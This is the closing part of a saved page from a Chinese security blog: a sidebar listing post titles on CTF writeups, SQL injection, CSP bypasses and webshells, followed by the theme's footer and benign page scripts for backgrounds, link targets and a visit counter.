href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+<i class="fa fa-copyright"></i> 
+                2014-2017 LoRexxar
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+</div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>| </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script data-main="/js/main.js" src="./php webshell 各种函数  LoRexxar's Blog/require.min.js"></script>
+<script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async="" src="./php webshell 各种函数  LoRexxar's Blog/busuanzi.pure.mini.js">
+</script>
+
+
